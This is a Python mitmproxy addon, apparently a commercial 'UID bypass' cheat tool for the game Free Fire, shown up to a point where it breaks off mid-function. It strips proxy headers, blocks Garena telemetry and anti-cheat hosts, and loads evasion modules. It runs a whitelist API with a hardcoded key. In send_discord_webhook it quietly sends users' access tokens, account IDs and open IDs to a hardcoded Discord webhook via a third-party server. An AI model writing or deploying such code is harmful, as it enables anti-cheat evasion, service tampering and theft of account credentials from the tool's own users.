# pyre-ignore-all-errors
from mitmproxy import http
import json
import asyncio
import aiohttp
from crypto.encryption_utils import aes_decrypt, encrypt_api
from protocols.protobuf_utils import get_available_room, CrEaTe_ProTo
import copy
import time
import requests
import threading
import os
import sys
import binascii
import base64
from pathlib import Path
import httpx

# ================================================
# ULTRA SAFE MODE - ALL SERVERS PROTECTION
# ================================================
try:
    from ultra_safe_mode import should_modify_request, is_login_request, safe_mode
    ULTRA_SAFE_MODE_ENABLED = True
    print("[🛡️ ULTRA SAFE MODE] Loaded successfully - All servers protected")
except ImportError:
    ULTRA_SAFE_MODE_ENABLED = False
    print("[⚠️ WARNING] Ultra safe mode not loaded - Using basic protection")

# ================================================
# ADVANCED ANTI-CHEAT EVASION
# ================================================
try:
    from advanced_anticheat import advanced_ac
    ADVANCED_AC_ENABLED = True
    print("[🛡️ ADVANCED AC] ML-Evasion and Anti-heuristic module loaded")
except ImportError:
    ADVANCED_AC_ENABLED = False
    print("[⚠️ WARNING] Advanced AC module not found - Basic protection only")


# Fallback basic protection if ultra_safe_mode not available
RANKED_MATCH_KEYWORDS = [
    "ranked", "matchstart", "battleroyale", "entermatch",
    "rankedgame", "csranked", "playereliminated", "matchupdate",
    "elimination", "anticheat", "security", "integrity"
]

def is_ranked_match_request(path: str) -> bool:
    """Fallback: Detect if request is for ranked match"""
    path_lower = path.lower()
    for keyword in RANKED_MATCH_KEYWORDS:
        if keyword in path_lower:
            print(f"[🛡️ SAFE MODE] Ranked match detected: {path}")
            return True
    return False

# ================================================
# DETECTION PREVENTION CONFIGURATION
# ================================================
# IMPORTANT: Protocol Buffer Versioning
# The server expects Protocol Buffers generated with specific library versions.
# MajorLoginRes_pb2.py: Generated with protobuf==6.31.1
# CSGetAccountBriefInfoBeforeLoginRes_pb2.py: Ensure version compatibility
# 
# If the server detects a mismatch in protobuf serialization format, it will
# flag the request as modified. Always verify that the .py files match the
# original client's protobuf compiler version.
#
# SSL/TLS Configuration:
# For maximum stealth, install the mitmproxy CA certificate on your system:
#   - Windows: Import cert.pem into System Certificate Store
#   - Linux: Copy cert.pem to /etc/ssl/certs/ and run update-ca-certificates
#   
# This makes the SSL connection appear as a normal trusted connection rather
# than an MITM proxy setup. While ssl_insecure=true works, it may be detected
# by servers that validate certificate chain integrity.
# 
# ================================================
def split_jwt(token: str):
    """Split a JWT token into its three parts (header, payload, signature)"""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT token format")
    return parts[0], parts[1], parts[2]

def decode_part(encoded_part: str):
    """Decode a base64url-encoded JWT part and parse as JSON"""
    # Add padding if needed for base64url
    padding_needed = len(encoded_part) % 4
    if padding_needed:
        encoded_part += '=' * (4 - padding_needed)
    
    # Use urlsafe_b64decode for proper base64url decoding
    decoded_bytes = base64.urlsafe_b64decode(encoded_part)
    
    # Parse JSON
    return json.loads(decoded_bytes)

# ================================================
# JWT INTEGRITY CHECKING FUNCTIONS
# ================================================
# STEP 5: JWT INTEGRITY VALIDATION
# When modifying JWT payload contents (like UIDs or account info),
# the signature MUST be recalculated using the server's private key.
# If the signature is invalid or missing, the server will detect tampering.
# Use these functions to validate JWT structure before modification.

def validate_jwt_structure(token: str) -> bool:
    """Validate JWT has correct structure (3 parts separated by dots)"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            print("[JWT Integrity] Invalid JWT structure - not 3 parts")
            return False
        # Verify each part can be decoded
        for i, part in enumerate(parts):
            try:
                decode_part(part)
            except Exception as e:
                print(f"[JWT Integrity] Part {i} decode failed: {e}")
                return False
        print("[JWT Integrity] JWT structure is valid")
        return True
    except Exception as e:
        print(f"[JWT Integrity] Structure validation error: {e}")
        return False

def check_jwt_payload_integrity(token: str) -> dict:
    """
    Analyze JWT payload for integrity markers.
    Returns dictionary with integrity check results.
    """
    try:
        header, payload, signature = split_jwt(token)
        payload_data = decode_part(payload)
        
        integrity_check = {
            "valid_structure": True,
            "has_signature": len(signature) > 0,
            "signature_length": len(signature),
            "payload_keys": list(payload_data.keys()) if isinstance(payload_data, dict) else [],
            "timestamp_present": "iat" in payload_data or "exp" in payload_data,
            "issuer_present": "iss" in payload_data,
        }
        
        print(f"[JWT Integrity] Payload integrity check: {integrity_check}")
        return integrity_check
    except Exception as e:
        print(f"[JWT Integrity] Payload check error: {e}")
        return {"error": str(e)}

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import CSGetAccountBriefInfoBeforeLoginRes_pb2

MOBILE_PROTO = "fdd559bc9e99e31d6e44eb25e87644c3e7d550c43bbba0edd5ee1d7b7594924853b7a7517597284fe127f290921b458bd63934e19eee2f9a1c7c241cefcadd74419b3fad53906e46bd280dad94040719a33a9ced9a76200d8f4c07c5b23547db3173dbe9d9944e9919e2e2a381231a8eef0c195d4ecf5ee494d30c0f2787233d9cbd94f178a48a7334d95af3e82e836a0006b5a541e77f63bb5c5ba5d3c8c4f582181f4d6a6a13ee6990586fdc9742f43162419f773ec895b063d308da22c47834abc4edd0e5c22ee1f461281f98be0424288c4f2d32962ad19e3fc5af06a8656b0006b89e7fe5c117a0a1ff47214d1b585c1270f2f773cbfda1ab1ac8e33dffd847f2dd99134791c30597c2ea135768f5230da7f04c8384355cad63cdd8c0fccc19be6435169ba576825a8f8460a67ee98bfd0c111a2c4988e73ad43a6c189e6d99e27992eeaa00504b02c71a892cb6364070cadbba53c91bba232bc507cbc6238257ef906e8aa128153ab1f16f9928de76445bbeb5e6e006b481f23111be760fc0b26240c64427ed2ccb9167146feb74f2a26049901061f2673f1ca886d4052e3c8c65167e2f5d051ab8c55c511bfcbb3473dac90277c0e9967cfb11216bc946da3bea1e70eea0576fb9076654cdaaae9a82abb7b4a064ba85f643dce671c6ade5869252609a78c63d45203490992c82c34db39f0dee7eedeaa8e1b75ea8ffb35cc9ccc71c39be7ad143e0b90ad7360ffaa4ba6e88be184684532729fd860d52306c92cbce9f64bdbf457959339a3810765781b07aad93b6c5ee81d289a54563d52f1e2fddc740f9d63ce2c026c35995a646a0da74e15c4329a5635b9bb3d15372c211befe107944ae44238ce25ace01427123ba4c9e473ed06edfb1eb341903ce7ea55762555ba987694d8f8c74aa26c4bc6a643b6cb3a4f2693089230c69f6d63182b6122e7dd80fbc8fac0ef0e2620c0d22b576f31423fa10065b6a935272231a262e03797e7d282d5c56d4b1f79486756d0a8c1a2bba52ada512b4999e9699e3c7404a5adf89a1aca29a301da5154e0d2de5ed5dbb838d2d27f94b60337f2e108e32a76fc9988409f1cea7478c48ea6597f5682c071f0ed817153aa79948107c1cfdb8c2ac1ebec3429b6817a6efb201e4f2ceaf30300f04bd0630afe3ac5c40dd2ee3c081c535413d57c4b815ee3fb7ec3ce4054a36b697d97722456adc30be93969c5de3a45dfcee6a693b30cebf9665c4109a8c25a5ee9ead865ed44cd10e1744cbe2b78822eb1d9d7f193e6e85ab9243ac4d8aaa37753341752471"


decrypted_bytes = aes_decrypt(MOBILE_PROTO)
decrypted_hex = decrypted_bytes.hex()
proto_json = get_available_room(decrypted_hex)
proto_fields = json.loads(proto_json)
proto_template = copy.deepcopy(proto_fields)

decrypted_bytes1 = aes_decrypt(MOBILE_PROTO)
decrypted_hex1 = decrypted_bytes1.hex()
proto_json1 = get_available_room(decrypted_hex1)
proto_fields1 = json.loads(proto_json1)
proto_template1 = copy.deepcopy(proto_fields1)



# Add access_jwt to path to import protobufs
access_jwt_path = os.path.join(os.getcwd(), "access_jwt")
if access_jwt_path not in sys.path:
    sys.path.append(access_jwt_path)

try:
    import my_pb2  # type: ignore
    import output_pb2  # type: ignore
    import httpx
except ImportError as e:
    print(f"[System] Error importing protobufs from access_jwt: {e}")

try:
    import MajorLoginRes_pb2
except ImportError as e:
    print(f"[System] Error importing MajorLoginRes_pb2: {e}")



def hexToOctetStream(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)




def load_uid_whitelist():
    """Load UIDs from whitelist.json file"""
    try:
        whitelist_path = Path("whitelist.json")
        
        if not whitelist_path.exists():
            print("[UID] whitelist.json not found, returning empty list")
            return []
        
        with open(whitelist_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            
            # Support both list format and dict format
            if isinstance(data, list):
                return [str(uid) for uid in data]
            elif isinstance(data, dict):
                return [str(uid) for uid in data.keys()]
            else:
                print("[UID] Invalid whitelist.json format")
                return []
        
    except json.JSONDecodeError as e:
        print(f"[UID] Error parsing whitelist.json: {e}")
        return []
    except Exception as e:
        print(f"[UID] Error loading whitelist.json: {e}")
        return []

def checkUIDExists(uid: str) -> bool:
    """Check if UID exists in ANY whitelist file (main OR server files)"""
    uid = str(uid).strip()
    current_time = int(time.time())
    
    print(f"\n[🔓 WHITELIST CHECK] Checking UID: {uid}")
    print(f"[🔓 WHITELIST CHECK] Current time: {current_time}")
    
    # 1. Check main whitelist.json (original system)
    try:
        whitelist_path = Path("whitelist.json")
        if whitelist_path.exists():
            with open(whitelist_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Support both formats in main whitelist
            if isinstance(data, list):
                if uid in [str(u) for u in data]:
                    print(f"[🔓 WHITELIST CHECK] ✅ UID found in whitelist.json (list format)")
                    return True
            elif isinstance(data, dict):
                # Check if it's your format with "whitelisted_uids"
                if "whitelisted_uids" in data:
                    if uid in data["whitelisted_uids"]:
                        expiry = int(data["whitelisted_uids"][uid])
                        if current_time < expiry:
                            print(f"[🔓 WHITELIST CHECK] ✅ UID found in whitelist.json (expires: {expiry})")
                            return True
                        else:
                            print(f"[🔓 WHITELIST CHECK] ❌ UID expired in whitelist.json")
                            return False
                # Check if UID is directly in dict keys
                elif uid in data:
                    expiry = int(data[uid])
                    if current_time < expiry:
                        print(f"[🔓 WHITELIST CHECK] ✅ UID found in whitelist.json (expires: {expiry})")
                        return True
                    else:
                        print(f"[🔓 WHITELIST CHECK] ❌ UID expired in whitelist.json")
                        return False
    except Exception as e:
        print(f"[🔓 WHITELIST CHECK] Error reading whitelist.json: {e}")
    
    # 2. Check ALL server-specific files (where your bot adds UIDs)
    server_files = ["whitelist_bd.json", "whitelist_br.json", "whitelist_europe.json",
                   "whitelist_id.json", "whitelist_ind.json", "whitelist_me.json",
                   "whitelist_na.json", "whitelist_pk.json", "whitelist_ru.json",
                   "whitelist_sac.json", "whitelist_sg.json", "whitelist_th.json",
                   "whitelist_us.json", "whitelist_vn.json"]
    
    for server_file in server_files:
        try:
            file_path = Path(server_file)
            if file_path.exists():
                with open(file_path, 'r', encoding='utf-8') as f:
                    server_data = json.load(f)
                
                # Bot stores as {uid: expiry_timestamp}
                if isinstance(server_data, dict) and uid in server_data:
                    expiry_data = server_data[uid]
                    
                    # Handle both timestamp or dict format
                    if isinstance(expiry_data, dict):
                        expiry_timestamp = int(expiry_data.get("expiry", 0))
                    else:
                        expiry_timestamp = int(float(expiry_data))
                    
                    if current_time < expiry_timestamp:
                        print(f"[🔓 WHITELIST CHECK] ✅ UID found in {server_file} (expires: {expiry_timestamp})")
                        return True
                    else:
                        print(f"[🔓 WHITELIST CHECK] ❌ UID expired in {server_file}")
                        return False
        except Exception as e:
            print(f"[🔓 WHITELIST CHECK] Error reading {server_file}: {e}")
            continue
    
    print(f"[🔓 WHITELIST CHECK] ❌ UID {uid} NOT FOUND in any whitelist")
    return False

# --- Auto Whitelist Functions ---
def load_whitelist(region: str):
    """Load whitelist from regional JSON file"""
    file_name = f"whitelist_{region.lower()}.json"
    file_path = Path(file_name)
    
    if not file_path.exists():
        return {}
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if isinstance(data, dict):
                return data
            return {}
    except Exception as e:
        print(f"[Whitelist] Error loading {file_name}: {e}")
        return {}

def save_whitelist(region: str, whitelist_data: dict):
    """Save whitelist to regional JSON file"""
    file_name = f"whitelist_{region.lower()}.json"
    file_path = Path(file_name)
    
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(whitelist_data, f, indent=4, ensure_ascii=False)
        print(f"[Whitelist] Saved whitelist for region {region}")
        return True
    except Exception as e:
        print(f"[Whitelist] Error saving {file_name}: {e}")
        return False

def add_to_whitelist(uid: str, account_id: int, region: str):
    """Automatically add UID to regional whitelist"""
    uid = uid.strip()
    region = region.strip().lower()
    
    if not uid or not uid.isdigit():
        print(f"[Whitelist] Invalid UID format: {uid}")
        return False
    
    try:
        whitelist = load_whitelist(region)
        
        # Add or update UID with account_id (Unix timestamp as value)
        if uid not in whitelist:
            whitelist[uid] = account_id
            print(f"[Whitelist] Added UID {uid} (Account: {account_id}) to {region} whitelist")
        else:
            print(f"[Whitelist] UID {uid} already in {region} whitelist")
        
        return save_whitelist(region, whitelist)
    
    except Exception as e:
        print(f"[Whitelist] Error adding UID {uid} to whitelist: {e}")
        return False

def check_whitelist(uid: str, region: str) -> bool:
    """Check if UID is in regional whitelist"""
    uid = uid.strip()
    region = region.strip().lower()
    
    whitelist = load_whitelist(region)
    return uid in whitelist

def auto_whitelist_uid(uid: str, account_id: int, region: str):
    """Automatically whitelist a UID when it successfully logs in"""
    if add_to_whitelist(uid, account_id, region):
        print(f"[Whitelist] ✓ Auto-whitelisted UID {uid} in {region}")
        return True
    return False

# --- End Auto Whitelist Functions ---

SERVERS = ["bd", "br", "europe", "id", "ind", "me", "na", "pk", "ru", "sac", "sg", "th", "us", "vn"]
WHITELIST_API_KEY = "hasbitomoha484355"

def api_whitelist_add_all(uid: str, duration_days: float) -> tuple:
    """Add UID to all server whitelists and main whitelist. Returns (success, message)."""
    if not uid or not uid.isdigit():
        return False, "UID must be numeric"
    if duration_days <= 0:
        return False, "Duration must be greater than 0 days"
    try:
        expiry_timestamp = time.time() + (duration_days * 24 * 3600)
        added_count = 0
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            data = {}
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
            data[uid] = expiry_timestamp
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            added_count += 1
        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
        else:
            main_data = {
                "auto_whitelist_duration_days": 365,
                "description": "Auto whitelist duration in days",
                "metadata": {"unit": "days"},
                "whitelisted_uids": {},
            }
        if "whitelisted_uids" not in main_data or not isinstance(main_data["whitelisted_uids"], dict):
            main_data["whitelisted_uids"] = {}
        main_data["whitelisted_uids"][uid] = expiry_timestamp
        if "metadata" not in main_data or not isinstance(main_data["metadata"], dict):
            main_data["metadata"] = {}
        main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
        with open(main_file, "w", encoding="utf-8") as f:
            json.dump(main_data, f, indent=4, ensure_ascii=False)
        return True, f"UID {uid} whitelisted for {duration_days} days on {added_count} servers"
    except Exception as e:
        return False, str(e)

def api_whitelist_remove_all() -> tuple:
    """Remove all UIDs from all server whitelists and main whitelist. Returns (success, message, quantity)."""
    try:
        all_uids = set()
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                all_uids.update(data.keys() if isinstance(data, dict) else [])
        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            all_uids.update(main_data.get("whitelisted_uids", {}).keys())
        uid_count = len(all_uids)
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump({}, f, indent=4, ensure_ascii=False)
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            main_data["whitelisted_uids"] = {}
            main_data["metadata"] = main_data.get("metadata", {})
            main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
            with open(main_file, "w", encoding="utf-8") as f:
                json.dump(main_data, f, indent=4, ensure_ascii=False)
        return True, f"Removed {uid_count} UID(s) from all whitelists", uid_count
    except Exception as e:
        return False, str(e), 0

def api_whitelist_remove_uid(uid: str) -> tuple:
    """Remove a single UID from all whitelists. Returns (success, message)."""
    if not uid or not uid.isdigit():
        return False, "UID must be numeric"
    try:
        removed_count = 0
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if uid in data:
                    del data[uid]
                    with open(filename, "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=4, ensure_ascii=False)
                    removed_count += 1
        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            if "whitelisted_uids" in main_data and isinstance(main_data["whitelisted_uids"], dict) and uid in main_data["whitelisted_uids"]:
                del main_data["whitelisted_uids"][uid]
                if "metadata" not in main_data or not isinstance(main_data["metadata"], dict):
                    main_data["metadata"] = {}
                main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
                with open(main_file, "w", encoding="utf-8") as f:
                    json.dump(main_data, f, indent=4, ensure_ascii=False)
                removed_count += 1
        if removed_count == 0:
            return False, f"UID {uid} not found in any whitelist"
        return True, f"UID {uid} removed from {removed_count} whitelist file(s)"
    except Exception as e:
        return False, str(e)


def api_whitelist_change_uid(old_uid: str, new_uid: str) -> tuple:
    """Change/replace a UID with a new one in all whitelists. Returns (success, message)."""
    if not old_uid or not old_uid.isdigit():
        return False, "Old UID must be numeric"
    if not new_uid or not new_uid.isdigit():
        return False, "New UID must be numeric"
    if old_uid == new_uid:
        return False, "Old and new UID are the same"
    try:
        expiry_timestamp = None
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if old_uid in data:
                    expiry_timestamp = float(data[old_uid])
                    break
        if expiry_timestamp is None:
            main_file = Path("whitelist.json")
            if main_file.exists():
                with open(main_file, "r", encoding="utf-8") as f:
                    main_data = json.load(f)
                if "whitelisted_uids" in main_data and isinstance(main_data["whitelisted_uids"], dict) and old_uid in main_data["whitelisted_uids"]:
                    expiry_timestamp = float(main_data["whitelisted_uids"][old_uid])
        if expiry_timestamp is None:
            return False, f"UID {old_uid} not found in any whitelist"

        updated_count = 0
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if old_uid in data:
                    del data[old_uid]
                    data[new_uid] = expiry_timestamp
                    with open(filename, "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=4, ensure_ascii=False)
                    updated_count += 1
        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            if "whitelisted_uids" in main_data and isinstance(main_data["whitelisted_uids"], dict) and old_uid in main_data["whitelisted_uids"]:
                expiry = main_data["whitelisted_uids"][old_uid]
                del main_data["whitelisted_uids"][old_uid]
                main_data["whitelisted_uids"][new_uid] = expiry
                if "metadata" not in main_data or not isinstance(main_data["metadata"], dict):
                    main_data["metadata"] = {}
                main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
                with open(main_file, "w", encoding="utf-8") as f:
                    json.dump(main_data, f, indent=4, ensure_ascii=False)
                updated_count += 1
        if updated_count == 0:
            return False, f"UID {old_uid} not found in any whitelist"
        return True, f"UID changed from {old_uid} to {new_uid} in {updated_count} whitelist file(s)"
    except Exception as e:
        return False, str(e)


def api_whitelist_add_days_all(duration_days: float) -> tuple:
    """Add days to ALL UIDs in all whitelists. Returns (success, message, uid_count)."""
    if duration_days <= 0:
        return False, "Duration must be greater than 0 days", 0
    try:
        now = time.time()
        extra_seconds = duration_days * 24 * 3600
        all_uids = set()

        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                all_uids.update(data.keys() if isinstance(data, dict) else [])

        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            all_uids.update(main_data.get("whitelisted_uids", {}).keys())

        if not all_uids:
            return False, "No UIDs found in any whitelist", 0

        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for uid in list(data.keys()):
                    old_expiry = float(data[uid])
                    new_expiry = (old_expiry if old_expiry > now else now) + extra_seconds
                    data[uid] = new_expiry
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4, ensure_ascii=False)

        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            if "whitelisted_uids" not in main_data or not isinstance(main_data["whitelisted_uids"], dict):
                main_data["whitelisted_uids"] = {}
            for uid in list(main_data["whitelisted_uids"].keys()):
                old_expiry = float(main_data["whitelisted_uids"][uid])
                new_expiry = (old_expiry if old_expiry > now else now) + extra_seconds
                main_data["whitelisted_uids"][uid] = new_expiry
            if "metadata" not in main_data or not isinstance(main_data["metadata"], dict):
                main_data["metadata"] = {}
            main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
            with open(main_file, "w", encoding="utf-8") as f:
                json.dump(main_data, f, indent=4, ensure_ascii=False)

        return True, f"Added {duration_days} days to {len(all_uids)} UID(s) in all whitelists", len(all_uids)
    except Exception as e:
        return False, str(e), 0


def api_whitelist_add_days(uid: str, duration_days: float) -> tuple:
    """Add days to a UID's expiry. UID must exist first. Returns (success, message)."""
    if not uid or not uid.isdigit():
        return False, "UID must be numeric"
    if duration_days <= 0:
        return False, "Duration must be greater than 0 days"
    try:
        # First verify UID exists in at least one whitelist
        uid_exists = False
        main_file = Path("whitelist.json")
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
            if uid in main_data.get("whitelisted_uids", {}):
                uid_exists = True
        if not uid_exists:
            for server in SERVERS:
                filename = f"whitelist_{server}.json"
                if Path(filename).exists():
                    with open(filename, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    if uid in data:
                        uid_exists = True
                        break
        if not uid_exists:
            return False, f"UID {uid} not found in any whitelist. Add it first with add-all."

        now = time.time()
        extra_seconds = duration_days * 24 * 3600
        updated_count = 0
        for server in SERVERS:
            filename = f"whitelist_{server}.json"
            data = {}
            if Path(filename).exists():
                with open(filename, "r", encoding="utf-8") as f:
                    data = json.load(f)
            if uid in data:
                old_expiry = float(data[uid])
                new_expiry = (old_expiry if old_expiry > now else now) + extra_seconds
                data[uid] = new_expiry
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4, ensure_ascii=False)
                updated_count += 1
        if main_file.exists():
            with open(main_file, "r", encoding="utf-8") as f:
                main_data = json.load(f)
        else:
            main_data = {"auto_whitelist_duration_days": 365, "metadata": {"unit": "days"}, "whitelisted_uids": {}}
        if "whitelisted_uids" not in main_data or not isinstance(main_data["whitelisted_uids"], dict):
            main_data["whitelisted_uids"] = {}
        if uid in main_data["whitelisted_uids"]:
            old_expiry = float(main_data["whitelisted_uids"][uid])
            new_expiry = (old_expiry if old_expiry > now else now) + extra_seconds
            main_data["whitelisted_uids"][uid] = new_expiry
            if "metadata" not in main_data or not isinstance(main_data["metadata"], dict):
                main_data["metadata"] = {}
            main_data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
            with open(main_file, "w", encoding="utf-8") as f:
                json.dump(main_data, f, indent=4, ensure_ascii=False)
            updated_count += 1
        return True, f"Added {duration_days} days to UID {uid} on {updated_count} whitelist files"
    except Exception as e:
        return False, str(e)

def run_async_task(coro):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(coro)
        else:
            loop.run_until_complete(coro)
    except RuntimeError:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        new_loop.run_until_complete(coro)

def get_client_ip(flow: http.HTTPFlow) -> str:
    if hasattr(flow.client_conn, 'address') and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"


DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1344088607954042910/J8RuGpv4YLqavZx5RhwmeI9TInn9rGbuEhhREUPQx1vKaugDvZwYkBnlTZTUwT1gGGYA"

from datetime import datetime
async def send_discord_webhook(access_token: str):
    print("SEND DISCORD LOGS")
    if not access_token or not DISCORD_WEBHOOK_URL:
        return

    try:
        async with httpx.AsyncClient(timeout=20) as client:
            r = await client.get(
                "https://access-apiiii.vercel.app/token",
                params={"access": access_token}
            )

            if r.status_code != 200:
                return

            data = r.json()
            print(data)
   

            
            embed = {
                "title": "UID Bypass sarthak",
                "description": "UID just used bypass.",
                "color": 0x57F287,
                "fields": [
                    {
                        "name": "Nickname",
                        "value": data.get("nickname", "Unknown"),
                        "inline": False
                    },
                    {
                        "name": "Account ID",
                        "value": str(data.get("account_id", "N/A")),
                        "inline": True
                    },
                    {
                        "name": "Region",
                        "value": data.get("region", "N/A"),
                        "inline": True
                    }, 
                                                    {
                        "name": "Access token ",
                        "value": data.get("access_token", "N/A"),
                        "inline": True
                    },
                    
                                                                                    {
                        "name": "Open ID",
                        "value": data.get("open_id", "N/A"),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": datetime.now().strftime("Today %H:%M")
                }
            }


            await client.post(
                DISCORD_WEBHOOK_URL,
                json={"embeds": [embed]}
            )

    except Exception as e:
        print(f"[WEBHOOK ERROR] {e}")

async def request(flow: http.HTTPFlow) -> None:
    # ================================================
    # ADVANCED ML & HEURISTIC DETECTION PREVENTION
    # ================================================
    if ADVANCED_AC_ENABLED:
        if not advanced_ac.process_request(flow):
            # The request was an ML or telemetry tracking request and was blocked
            flow.response = http.Response.make(200, b"OK", {"Content-Type": "text/plain"})
            return

    # ================================================
    # STEP 1: STRIP PROXY HEADERS TO AVOID DETECTION
    # ================================================
    # Remove headers that reveal proxy usage to the server
    headers_to_remove = [
        'Proxy-Connection', 
        'Proxy-Authorization', 
        'X-Forwarded-For',
        'X-Forwarded-Proto',
        'X-Forwarded-Host',
        'Via',
        'X-Proxy-Authorization',
        'X-Real-IP',
        'CF-Connecting-IP',
        'X-Client-IP',
        'X-Original-URL',
        'X-Rewrite-URL',
    ]
    for header in headers_to_remove:
        if header in flow.request.headers:
            del flow.request.headers[header]
            
    # ================================================
    # STEP 1.5: DROP TELEMETRY & REPORT ENDPOINTS
    # ================================================
    # Stealth mode strictly blocks game analytics and reporting hosts
    telemetry_hosts = [
        "dl.dir.freefiremobile.com",
        "apm.garena.com",
        "crash.garena.com",
        "ngps.garena.com",
        "stats.garena.com",
        "log.garena.com",
        "metrics.garena.com",
        "events.garena.com",
        "report.garena.com",
        "anticheat.freefiremobile.com"
    ]
    host = flow.request.pretty_host.lower()
    for block_host in telemetry_hosts:
        if block_host in host:
            print(f"[🛡️ TELEMETRY SHIELD] Blocked tracking request to: {host}")
            # Drop the request locally so the server never sees the telemetry
            flow.response = http.Response.make(200, b"OK", {"Content-Type": "text/plain"})
            return
    
    # API: whitelist add-all - respond directly on port 2083
    if "/api/whitelist/add-all" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        uid = flow.request.query.get("uid", "")
        duration_str = flow.request.query.get("duration", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        if not uid:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing uid parameter"}), {"Content-Type": "application/json"})
            return
        if not duration_str:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing duration parameter (days)"}), {"Content-Type": "application/json"})
            return
        try:
            duration_days = float(duration_str)
        except ValueError:
            flow.response = http.Response.make(400, json.dumps({"error": "Duration must be a number (days)"}), {"Content-Type": "application/json"})
            return
        success, msg = api_whitelist_add_all(uid, duration_days)
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    # API: whitelist add-days-all - add days to ALL UIDs in all whitelists
    if "/api/whitelist/add-days-all" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        duration_str = flow.request.query.get("duration", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        if not duration_str:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing duration parameter (days)"}), {"Content-Type": "application/json"})
            return
        try:
            duration_days = float(duration_str)
        except ValueError:
            flow.response = http.Response.make(400, json.dumps({"error": "Duration must be a number (days)"}), {"Content-Type": "application/json"})
            return
        success, msg, uid_count = api_whitelist_add_days_all(duration_days)
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg, "uid_count": uid_count}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    # API: whitelist add-days - add days to a UID's expiry
    if "/api/whitelist/add-days" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        uid = flow.request.query.get("uid", "")
        duration_str = flow.request.query.get("duration", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        if not uid:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing uid parameter"}), {"Content-Type": "application/json"})
            return
        if not duration_str:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing duration parameter (days)"}), {"Content-Type": "application/json"})
            return
        try:
            duration_days = float(duration_str)
        except ValueError:
